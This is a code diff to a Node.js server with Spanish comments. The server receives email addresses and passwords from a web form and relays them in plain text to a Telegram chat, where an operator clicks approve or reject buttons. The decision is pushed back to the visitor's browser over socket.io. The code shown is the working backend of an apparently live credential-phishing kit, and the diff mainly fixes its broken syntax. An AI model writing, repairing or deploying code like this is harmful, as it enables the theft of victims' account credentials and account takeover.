@@ -7,7 +7,6 @@ const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
 const bodyParser = require('body-parser');
-const { v4: uuidv4 } = require('uuid'); // Generador de IDs únicos
 
 const server = http.createServer(app);
 const io = new Server(server, {
@@ -28,34 +27,32 @@ app.use(bodyParser.json());
 io.on('connection', (socket) => {
   console.log('🧠 Usuario conectado:', socket.id);
 
- ; // Crear ID único para esta sesión
-    activeSockets.set(sessionId, socket); // Guardar el socket usando sessionId
+  // Al recibir datos del formulario
+  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
+    activeSockets.set(sessionId, socket); // Guardar el socket con sessionId
 
     const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
-
-  socket.on('dataForm', ({ correo, contrasena, sessionId }) => {
-  activeSockets.set(sessionId, socket);
-
-  const mensaje = `🔐 Nuevo intento de acceso:\n\n📧 Correo: ${correo}\n🔑 Contraseña: ${contrasena}`;
-  const botones = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
-          { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
+    const botones = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '✅ Aceptar', callback_data: `aprobado_${sessionId}` },
+            { text: '❌ Rechazar', callback_data: `rechazado_${sessionId}` }
+          ]
         ]
-      ]
-    }
-  };
+      }
+    };
 
-  bot.sendMessage(telegramChatId, mensaje, botones);
+    bot.sendMessage(telegramChatId, mensaje, botones);
+  });
+
+  // Cuando el navegador reconecta desde opciones.html
+  socket.on('reconectar', (sessionId) => {
+    activeSockets.set(sessionId, socket);
+  });
 });
-socket.on('reconectar', (sessionId) => {
-  activeSockets.set(sessionId, socket);
-});
 
-
-
+// Cuando se presiona un botón en Telegram
 bot.on('callback_query', (query) => {
   const data = query.data;
   const chatId = query.message.chat.id;
@@ -65,18 +62,14 @@ bot.on('callback_query', (query) => {
     const socket = activeSockets.get(sessionId);
 
     if (socket) {
-      const redireccion = data.startsWith('aprobado_') ? '/index.html' : '/rechazado.html';
-      socket.emit('redirect', { url: redireccion });
-
-      const respuesta = data.startsWith('aprobado_')
-        ? '🟢 ¡Acceso aprobado!'
-        : '🔴 Acceso denegado.';
-
-      bot.sendMessage(chatId, respuesta);
-      activeSockets.delete(sessionId);
+      const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
+      socket.emit('respuesta', decision);
+      bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
     } else {
       bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
     }
+
+    activeSockets.delete(sessionId);
   }
 });
 
